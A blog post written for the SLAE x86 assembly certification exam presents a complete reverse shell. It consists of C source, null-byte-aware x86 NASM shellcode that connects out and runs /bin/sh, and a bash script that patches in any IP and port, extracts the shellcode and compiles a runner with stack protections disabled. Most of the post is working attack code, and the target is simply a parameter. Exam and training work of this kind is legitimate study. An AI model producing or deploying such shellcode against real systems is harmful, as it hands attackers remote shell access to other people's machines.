---
layout: post
title: "SLAE x86 Exam Part 2"
description: "SLAE x86 Exam Part 2: Reverse Shell"
modified: 2018-05-25T10:14:00-05:00
tags: [pentest, asm, x86, slae]
---


# Overview
This blog post has been created for completing the requirements of the 
SecurityTube Linux Assembly Expert certification: 

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](/http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1260

---

After several days of research and frustration spent trying to coax a Bind 
shell out of a seemingly incoherent string of bytes, converting the result of 
the first exercise into a Reverse shell to complete Part 2 of the exam was 
refreshingly easy.  

## C Implementation

As before, I began by implementing the exercise in C.  This involved little
more than defining a remote address, then combining the `bind()`, `listen()` 
and `accept()` calls into a single call to `connect()`.  Here's where I ended 
up:

{% highlight c %}
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define ADDR "127.0.0.1"
#define PORT 2055

int sock_fd;
struct sockaddr_in s_addr;

int main(int argc, char **argv) {
    // Create a TCP socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    // Initialize sockaddr_in struct
    s_addr.sin_family = AF_INET;
    s_addr.sin_port = htons(PORT);
    s_addr.sin_addr.s_addr = inet_addr(ADDR);

    connect(sock_fd, (struct sockaddr *)&s_addr, sizeof(s_addr));

    // Duplicate stdin/out/err file descriptors
    for (int i = 2; i >= 0; i--) dup2(sock_fd, i);

    // Execute shell
    execl("/bin/sh", NULL, NULL);
    close(sock_fd);

    return 0;
}
{% endhighlight %}

## ASM Implementation
Implementing this project in ASM was equally quick, save for one challenge: I 
could not figure out how to deal with null bytes in the user-provided IP. 
After a few hours of experimentation, I added a warning to my compiler script
and moved on, using 127.1.1.1 instead of 127.0.0.1 as a test case.  

Here's the code for a Reverse shell in x86 ASM:

{% highlight nasm %}

global _start

section .text
_start:
    ; sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    xor ebx, ebx    ; Clear EBX
    mul ebx         ; Multiply EAX * 0, also clears EDX
    mov al, 0x66    ; SOCKETCALL syscall
    mov edi, eax    ; Save syscall for future use

    inc ebx         ; SYS_SOCKET (1)

    push edx        ; SYS_SOCKET arg: PROTOCOL
    push 0x1        ; SYS_SOCKET arg: SOCK_STREAM
    push 0x2        ; SYS_SOCKET arg: AF_INET
    mov ecx, esp    ; Point ECX to syscall args

    int 0x80        ; Execute syscall
    xchg esi, eax   ; Save syscall return value

    ; connect(sock_fd, (struct sockaddr *)&s_addr, sizeof(s_addr));
    mov eax, edi    ; SOCKETCALL
    or bl, 0x2      ; SYS_CONNECT (3)

    push 0x0101017f ; sin_addr = 127.1.1.1
    mov cx, 0xd304  ; sin_port
    shl ecx, 0x10   ; ECX -> 0x5C110000
    or cl, 0x2      ; ECX -> 0x5C110002
    push ecx        ; Push sockaddr struct
    mov ecx, esp    ; Move pointer to struct sockaddr into ECX

    push 0x10       ; sockaddr_in length: short + unsigned short + unsigned long + char[8] = 16 bytes
    push ecx        ; Pointer to new sockaddr_in struct
    push esi        ; Old socket FD
    mov ecx, esp    ; Move argument pointer to ECX

    int 0x80        ; Execute syscall

    ; for (int i = 2; i >= 0; i--) dup2(sock_fd, i);
    xchg esi, ebx   ; Our socket's FD is stored in ESI; move it to EBX
    xor ecx, ecx    ; Clear ECX

dup_loop:
    mov al, 0x3f    ; dup2 syscall
    int 0x80        ; Execute syscall
    inc ecx
    cmp cl, 0x3
    jle dup_loop

    ; execl("/bin/sh", NULL, NULL);
    push edx        ; null terminate
    push 0x68732F2F ; hs//
    push 0x6E69622F ; nib/
    mov ebx, esp    ; Load executable path into EBX
    xor eax, eax    ; Clear EAX
    mov al, 0xB     ; EXECVE syscall
    xor ecx, ecx    ; Clear ECX
    int 0x80
{% endhighlight %}

## Compiling:
I made some changes to the compiler script to take in an IP address in addition
to the port:

{% highlight bash %}
#!/bin/bash

# SLAE x86 Exam #1: Bind Shell
#
# compile.sh: Update port if specified, then compile ${NAME}.nasm,
# ${NAME}.c, and shellcode.c.
#
# Author: Kerry Milan
#         SLAE-1260
#         me@kerrymilan.com
#
# Usage: ./compile.sh [-h] [-i ip] [-p port]

    ROOT=$(dirname $(readlink -f $0))
    NAME="revshell"

    # Parse arguments for Port and IP Address
    PORT=
    IP_ADDR=

while getopts ":i:p:" opt; do
    case "$opt" in
        i) IP_ADDR=$OPTARG
        ;;
        p) PORT=$OPTARG
        ;;
        :)
            echo "Option -$OPTARG requires an argument." >&2
            exit 1
        ;;
        \?)
            echo "Usage: $(readlink -f $0) [-h] [-i ip] [-p port]"
            exit 0
        ;;
    esac
done

if [ ! -z ${PORT} ]; then
    if [ ${PORT} -lt 0  -o ${PORT} -gt 65535 ]; then
        echo "Invalid port specified: ${PORT}"
        exit 1
    fi

    PORT_INT=${PORT}
    PORT_HEX=$(printf "%04x0x" ${PORT_INT} | tac -rs .. | tr -d '\n')

    echo " [+] Updating port: ${PORT_INT} (${PORT_HEX})"
    sed -ri "s/^#define PORT [0-9]+\s*$/#define PORT ${PORT_INT}/" ${ROOT}/${NAME}.c
    sed -ri "s/0x[0-F]+\s+;\s*sin_port\s*$/${PORT_HEX}  ; sin_port/" ${ROOT}/${NAME}.nasm

    echo ${PORT_HEX:2:4} | egrep -q "(^00)|(00$)"
    [ $? -eq 0 ] && echo " [-] WARNING: This port introduces null chars into shellcode"
fi

if [ ! -z ${IP_ADDR} ]; then
    IP_STR=$(echo "${IP_ADDR}" | egrep -o "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$")
    IP_HEX="0x$(for i in $(echo "${IP_STR}" | tr '.' '\n'); do printf "%02x" ${i}; done | tac -rs ..)"

    echo " [+] Updating IP: ${IP_STR} (${IP_HEX})"
    sed -ri "s/^#define ADDR \"[0-9\.]+\"\s*$/#define ADDR \"${IP_STR}\"/" ${ROOT}/${NAME}.c
    sed -ri "s/0x[0-F]+\s+;\s*sin_addr.*$/${IP_HEX} ; sin_addr = ${IP_STR}/" ${ROOT}/${NAME}.nasm

    echo ${IP_HEX:2:8} | egrep -q "(^00)|(^..00)|(00..$)|(00$)"
    [ $? -eq 0 ] && echo " [-] WARNING: This IP introduces null chars into shellcode"
fi

echo -n " [+] Compiling ${NAME}.c..."
/usr/bin/gcc -ggdb3 -o ${ROOT}/${NAME}_c ${ROOT}/${NAME}.c > /dev/null 2>&1
[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Compiling ${NAME}.nasm..."
/usr/bin/nasm -f elf32 ${ROOT}/${NAME}.nasm > /dev/null 2>&1
[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Linking ${NAME}.o..."
/usr/bin/ld ${ROOT}/${NAME}.o -o ${ROOT}/${NAME} > /dev/null 2>&1
[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Generating shellcode from ${NAME}..."
SHELLCODE=$(/usr/bin/objdump -D ${ROOT}/${NAME} \
            | egrep ":\s+([0-f]{2}\s)+" -o \
            | sed -r "s/^:\s+//g" \
            | sed -r "s/([0-f]{2})/\\\x\1/g" | tr -d "\n " \
            | fold -w 48 \
            | sed -r "s/(^.*$)/    \"\1\"/g"; \
            echo ";")

[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Building shellcode.c..."
cat > ${ROOT}/shellcode.c << EOF
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
${SHELLCODE}

int main (int argc, char **argv) {
    printf("Shellcode Length:  %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
EOF
[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Compiling shellcode.c..."
/usr/bin/gcc -ggdb3 -z execstack -fno-stack-protector \
        -o ${ROOT}/shellcode ${ROOT}/shellcode.c > /dev/null 2>&1
[ $? -eq 0 ] && echo "Done" || echo "ERROR"
{% endhighlight %}

## Screenshots

![Execution of C implementation]({{ "/assets/images/2.1-revshell_c.png" | absolute_url}})
![Execution of NASM implementation]({{ "/assets/images/2.2-revshell.png" | absolute_url}})
